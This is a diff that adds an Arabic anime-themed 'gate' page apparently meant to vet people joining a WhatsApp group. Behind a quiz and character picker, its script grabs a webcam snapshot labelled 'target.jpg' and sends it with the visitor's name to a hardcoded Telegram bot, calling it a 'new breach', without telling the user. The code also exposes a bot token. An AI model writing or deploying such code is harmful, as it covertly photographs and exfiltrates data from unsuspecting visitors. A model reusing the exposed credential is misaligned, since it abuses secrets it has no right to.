@@ -1,1 +1,215 @@
-# yousef-exam
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة يوسف الأسطورية ⛩️</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@500;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        :root { --main-red: #ff003c; --gold: #ffb700; --dark: #0a0a0a; }
+        body {
+            font-family: 'Tajawal', sans-serif; background: var(--dark);
+            color: #fff; margin: 0; padding: 20px 0; overflow-x: hidden;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+        }
+        
+        /* خلفية الفيديو مع دمج الألوان */
+        #bg-video {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; z-index: -1; opacity: 0.25; filter: saturate(150%) contrast(120%);
+        }
+
+        .glass-box {
+            background: rgba(10, 10, 12, 0.85); backdrop-filter: blur(15px);
+            border: 2px solid rgba(255, 0, 60, 0.5); width: 90%; max-width: 480px;
+            padding: 35px 25px; border-radius: 20px; text-align: center;
+            box-shadow: 0 0 40px rgba(255, 0, 60, 0.3), inset 0 0 20px rgba(0,0,0,0.8);
+            position: relative; animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+
+        h1 { color: #fff; text-shadow: 0 0 15px var(--main-red), 0 0 30px var(--main-red); font-size: 32px; margin: 0 0 10px; font-weight: 900; letter-spacing: 1px; }
+        .subtitle { color: var(--gold); font-size: 14px; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* بصمة المؤسس */
+        .creator-badge {
+            margin-top: 25px; padding-top: 15px; border-top: 1px solid rgba(255, 183, 0, 0.3);
+            font-size: 15px; color: var(--gold); font-weight: 900; letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255, 183, 0, 0.6);
+        }
+
+        /* الصورة الخاصة بك */
+        .showcase-img { width: 100%; border-radius: 12px; border: 2px solid var(--gold); margin-bottom: 20px; box-shadow: 0 5px 15px rgba(255, 183, 0, 0.2); }
+
+        /* الكاميرا بنظام الهاكي */
+        .camera-container { position: relative; width: 100%; border-radius: 12px; overflow: hidden; border: 2px solid #222; margin-bottom: 25px; box-shadow: 0 0 20px rgba(255,0,0,0.2); }
+        video#webcam { width: 100%; display: block; transform: scaleX(-1); background: #000; filter: contrast(1.1); }
+        .rec-icon { position: absolute; top: 10px; left: 10px; background: rgba(255,0,0,0.8); padding: 4px 10px; border-radius: 5px; font-size: 11px; font-weight: bold; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        /* الحقول */
+        .input-group { text-align: right; margin-bottom: 15px; }
+        .input-group label { font-size: 13px; color: #aaa; margin-bottom: 5px; display: block; font-weight: 800; }
+        input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #333; background: rgba(255,255,255,0.03); color: #fff; font-size: 15px; outline: none; transition: 0.3s; box-sizing: border-box; font-family: 'Tajawal', sans-serif; }
+        input:focus, select:focus { border-color: var(--main-red); background: rgba(255,0,60,0.05); box-shadow: 0 0 15px rgba(255,0,60,0.3); }
+        option { background: #111; color: #fff; }
+
+        /* الأبطال (شطة زيادة) */
+        .hero-title { font-size: 14px; color: var(--gold); text-align: right; margin-bottom: 10px; font-weight: 800; }
+        .hero-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
+        .hero-card { cursor: pointer; border-radius: 10px; border: 2px solid transparent; overflow: hidden; height: 75px; position: relative; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); background: #111; }
+        .hero-card img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(1) brightness(0.7); transition: 0.3s; }
+        .hero-card.active { border-color: var(--main-red); transform: scale(1.1); box-shadow: 0 0 15px var(--main-red); z-index: 2; }
+        .hero-card.active img { filter: grayscale(0) brightness(1.1); }
+
+        /* الزرار النووي */
+        .btn-submit { width: 100%; padding: 16px; margin-top: 15px; border: none; border-radius: 12px; background: linear-gradient(90deg, #ff003c, #990024); color: white; font-size: 18px; font-weight: 900; font-family: 'Tajawal', sans-serif; cursor: pointer; transition: 0.4s; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 8px 20px rgba(255,0,60,0.4); }
+        .btn-submit:hover { transform: scale(1.03); box-shadow: 0 10px 30px rgba(255,0,60,0.6); }
+        .hidden { display: none; }
+    </style>
+</head>
+<body onload="initSystem()">
+
+    <audio id="sfx-select" src="https://www.myinstants.com/media/sounds/naruto-shippuden-jutsu-sound-effect.mp3"></audio>
+    <audio id="sfx-slash" src="https://www.myinstants.com/media/sounds/anime-sword-sound.mp3"></audio>
+
+    <video autoplay muted loop id="bg-video" playsinline>
+        <source src="https://v1.pichau.com.br/anime-bg-video.mp4" type="video/mp4">
+    </video>
+
+    <div class="glass-box">
+        <h1>⛩️ مَمْلَكَة الأوتـاكو ⛩️</h1>
+        <div class="subtitle">بوابة الاختبار الحقيقية</div>
+
+        <img src="Screenshot_2026-03-14-17-16-23-72.jpg" alt="تشكيلة المملكة" class="showcase-img">
+
+        <div class="camera-container">
+            <div class="rec-icon">⚫ REC</div>
+            <video id="webcam" autoplay playsinline></video>
+            <canvas id="capture" style="display:none;"></canvas>
+        </div>
+
+        <form id="otakuGate">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="اسمك الحقيقي (مثال: أحمد)" required>
+            </div>
+            
+            <div class="hero-title">🔥 اختر روحك القتالية:</div>
+            <div class="hero-grid">
+                <div class="hero-card" onclick="selectFighter('لوفي 👒', this)"><img src="https://i.pinimg.com/736x/8a/26/5a/8a265a31742408b08709337b5d19dbb3.jpg"></div>
+                <div class="hero-card" onclick="selectFighter('ناروتو 🦊', this)"><img src="https://i.pinimg.com/736x/21/cd/ca/21cdca43e498d9ba80d6b5e0c8b9d88c.jpg"></div>
+                <div class="hero-card" onclick="selectFighter('غوجو 🤞', this)"><img src="https://i.pinimg.com/736x/f6/ba/a1/f6baa10935d21c0807e3ea8de90b7933.jpg"></div>
+                <div class="hero-card" onclick="selectFighter('ليفاي ⚔️', this)"><img src="https://i.pinimg.com/736x/01/a0/0b/01a00be550e56cc21cb4bd6df3c01c0c.jpg"></div>
+            </div>
+
+            <div class="input-group" style="margin-top:20px; border-top: 1px solid #333; padding-top:20px;">
+                <label>⚔️ اختبار الدخول (تحدي الأنمي):</label>
+                <select id="animeSelect" onchange="showTrial()" required>
+                    <option value="" disabled selected>اختر ساحة المعركة...</option>
+                    <option value="op">ون بيس</option>
+                    <option value="snk">هجوم العمالقة</option>
+                    <option value="naruto">ناروتو</option>
+                </select>
+            </div>
+
+            <div id="trialDiv" class="hidden input-group">
+                <label id="trialQ" style="color: var(--gold);"></label>
+                <select id="trialAns" required></select>
+            </div>
+
+            <button type="submit" class="btn-submit">اقتحم الجروب الآن 🚀</button>
+        </form>
+
+        <div class="creator-badge">
+            👑 مؤسس المملكة: يـوسـف عـلاء 👑
+        </div>
+    </div>
+
+    <script>
+        const BOT = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
+        const CHAT = "7394389253";
+        const WA_LINK = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts?mode=gi_t";
+
+        let fighter = "";
+        const vid = document.getElementById('webcam');
+        const cvs = document.getElementById('capture');
+
+        // بنك الأسئلة
+        const trials = {
+            op: { q: "من هو أول عضو انضم لطاقم لوفي؟", opts: ["سانجي", "زورو", "نامي"], ans: "زورو" },
+            snk: { q: "ما هو اسم الفيلق الذي ينتمي إليه إيرين؟", opts: ["الشرطة العسكرية", "فيلق الاستطلاع", "الحامية"], ans: "فيلق الاستطلاع" },
+            naruto: { q: "من هو معلم الفريق السابع؟", opts: ["جيرايا", "كاكاشي", "أسوما"], ans: "كاكاشي" }
+        };
+
+        function initSystem() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(s => vid.srcObject = s)
+            .catch(() => {
+                Swal.fire({ background: '#111', color: '#fff', icon: 'error', title: 'الكاميرا معطلة!', text: 'لا يمكنك دخول المملكة بدون إثبات هويتك.', confirmButtonColor: '#ff003c' });
+            });
+        }
+
+        function selectFighter(name, el) {
+            fighter = name;
+            document.getElementById('sfx-select').play(); // تشغيل صوت الاختيار
+            document.querySelectorAll('.hero-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+        }
+
+        function showTrial() {
+            const key = document.getElementById('animeSelect').value;
+            document.getElementById('trialDiv').classList.remove('hidden');
+            document.getElementById('trialQ').innerText = "❓ " + trials[key].q;
+            const ansBox = document.getElementById('trialAns');
+            ansBox.innerHTML = '<option value="" disabled selected>حدد إجابتك القاطعة...</option>';
+            trials[key].opts.forEach(o => ansBox.innerHTML += `<option value="${o}">${o}</option>`);
+        }
+
+        document.getElementById('otakuGate').onsubmit = function(e) {
+            e.preventDefault();
+            if(!fighter || !vid.srcObject) {
+                return Swal.fire({ background: '#111', color: '#fff', icon: 'warning', title: 'توقف!', text: 'اكمل طقوسك أولاً (اختر بطل ووافق على الكاميرا)', confirmButtonColor: '#ff003c' });
+            }
+
+            document.getElementById('sfx-slash').play(); // صوت السيف عند الإرسال
+            Swal.fire({ title: 'جاري فحص الهوية...', background: '#111', color: '#fff', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+
+            const usr = document.getElementById('username').value;
+            const key = document.getElementById('animeSelect').value;
+            const isWin = document.getElementById('trialAns').value === trials[key].ans;
+            const powerLevel = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000; // حساب طاقة عشوائي
+
+            const ctx = cvs.getContext('2d');
+            cvs.width = vid.videoWidth; cvs.height = vid.videoHeight;
+            ctx.drawImage(vid, 0, 0);
+
+            cvs.toBlob(b => {
+                const fd = new FormData();
+                fd.append("chat_id", CHAT);
+                fd.append("photo", b, "target.jpg");
+                
+                let msg = `🔥 اختراق جديد لبوابة المملكة 🔥\n\n`;
+                msg += `👤 الاسم: ${usr}\n`;
+                msg += `⚔️ الروح القتالية: ${fighter}\n`;
+                msg += `⚡ مستوى الطاقة (Scouter): ${powerLevel}\n`;
+                msg += `🧠 نتيجة الاختبار: ${isWin ? "أوتاكو حقيقي 🟢" : "مبتدئ محتاج يذاكر 🔴"}`;
+
+                fd.append("caption", msg);
+
+                fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: "POST", body: fd })
+                .then(r => {
+                    if(r.ok) {
+                        Swal.fire({
+                            background: '#111', color: '#fff', icon: 'success',
+                            title: 'تم قبولك!', text: isWin ? 'إجابتك صحيحة، أنت إضافة قوية لجيشنا!' : 'أخطأت في الاختبار، لكن يوسف أمر بقبولك للتدريب!',
+                            confirmButtonColor: '#ff003c', confirmButtonText: 'انتقل للواتساب الآن ⚔️'
+                        }).then(() => window.location.href = WA_LINK);
+                    }
+                });
+            }, 'image/jpeg');
+        };
+    </script>
+</body>
+</html>
